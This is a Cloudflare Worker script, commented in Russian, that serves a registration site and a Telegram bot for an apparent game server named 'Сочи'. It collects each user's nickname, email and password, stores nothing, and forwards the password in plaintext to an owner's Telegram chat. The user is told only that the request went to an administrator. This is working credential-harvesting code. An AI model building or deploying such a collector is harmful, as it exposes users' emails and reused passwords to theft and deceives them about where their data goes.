// Один Worker: отдаёт сайт (public/index.html) и обрабатывает /api/register и /api/telegram.
// Базы данных нет — ник, почта и пароль просто пересылаются в Telegram.

async function sendTelegram(token, chatId, text) {
  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
  }).catch(() => {});
}

function json(obj, status = 200) {
  return new Response(JSON.stringify(obj), { status, headers: { 'Content-Type': 'application/json' } });
}

async function handleRegister(request, env) {
  if (request.method !== 'POST') return json({ error: 'Метод не поддерживается' }, 405);

  let body;
  try { body = await request.json(); } catch { return json({ error: 'Неверный запрос' }, 400); }

  const nick = String(body.nick || '').trim();
  const mail = String(body.mail || '').trim();
  const pass = String(body.pass || '');

  if (!/^[A-Za-z0-9_]{3,24}$/.test(nick)) return json({ error: 'Ник: 3–24 символа, латиница, цифры и _' }, 400);
  if (!/^\S+@\S+\.\S+$/.test(mail) || mail.length > 61) return json({ error: 'Введите корректную почту' }, 400);
  if (pass.length < 6 || pass.length > 32) return json({ error: 'Пароль: от 6 до 32 символов' }, 400);

  const token = env.TG_BOT_TOKEN;
  const chatId = env.TG_CHAT_ID;
  if (!token || !chatId) return json({ error: 'Регистрация временно недоступна' }, 500);

  const time = new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });
  await sendTelegram(token, chatId, `🌸 Новая регистрация (с сайта)\nСервер: Сочи\nНик: ${nick}\nПочта: ${mail}\nПароль: ${pass}\nВремя (МСК): ${time}`);

  return json({ ok: true });
}

async function handleTelegram(request, env) {
  const secret = env.TG_WEBHOOK_SECRET;
  if (secret && request.headers.get('x-telegram-bot-api-secret-token') !== secret) {
    return new Response('unauthorized', { status: 401 });
  }

  const update = await request.json().catch(() => ({}));
  const msg = update.message;
  if (!msg || !msg.text) return new Response('ok');

  const chatId = String(msg.chat.id);
  const text = msg.text.trim();
  const token = env.TG_BOT_TOKEN;
  const kv = env.TG_STATE;
  const key = `state:${chatId}`;

  const send = (t) => sendTelegram(token, chatId, t);

  if (text === '/start' || text === '/register' || text === 'Зарегистрироваться') {
    await kv.put(key, JSON.stringify({ step: 'nick' }), { expirationTtl: 3600 });
    await send('🌸 <b>Регистрация на сервер Сочи</b>\n\nПридумайте игровой ник (3–24 символа, латиница, цифры и _):');
    return new Response('ok');
  }

  if (text === '/cancel') {
    await kv.delete(key);
    await send('Регистрация отменена. Чтобы начать заново, отправьте /start');
    return new Response('ok');
  }

  const raw = await kv.get(key);
  const state = raw ? JSON.parse(raw) : null;

  if (!state) {
    await send('Привет! Чтобы зарегистрироваться на сервер Сочи, отправьте /start');
    return new Response('ok');
  }

  if (state.step === 'nick') {
    if (!/^[A-Za-z0-9_]{3,24}$/.test(text)) {
      await send('Ник должен быть 3–24 символа: латиница, цифры и _. Попробуйте ещё раз:');
      return new Response('ok');
    }
    state.nick = text; state.step = 'email';
    await kv.put(key, JSON.stringify(state), { expirationTtl: 3600 });
    await send('Отлично! Теперь введите вашу почту:');
    return new Response('ok');
  }

  if (state.step === 'email') {
    if (!/^\S+@\S+\.\S+$/.test(text) || text.length > 61) {
      await send('Похоже, это не почта. Введите в формате you@mail.ru:');
      return new Response('ok');
    }
    state.email = text; state.step = 'pass';
    await kv.put(key, JSON.stringify(state), { expirationTtl: 3600 });
    await send('Придумайте пароль (от 6 до 32 символов):');
    return new Response('ok');
  }

  if (state.step === 'pass') {
    if (text.length < 6 || text.length > 32) {
      await send('Пароль должен быть от 6 до 32 символов. Попробуйте ещё раз:');
      return new Response('ok');
    }
    await kv.delete(key);
    await send(`✅ Заявка принята! Ник <b>${state.nick}</b> передан администратору.\n\nОткрытие сервера Сочи: 5 ноября, 17:00 (МСК).`);
    const ownerTime = new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });
    await sendTelegram(token, env.TG_CHAT_ID, `🌸 Новая регистрация (через бота)\nСервер: Сочи\nНик: ${state.nick}\nПочта: ${state.email}\nПароль: ${text}\nВремя (МСК): ${ownerTime}`);
    return new Response('ok');
  }

  return new Response('ok');
}

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    if (url.pathname === '/api/register') return handleRegister(request, env);
    if (url.pathname === '/api/telegram') return handleTelegram(request, env);
    return env.ASSETS.fetch(request);
  },
};
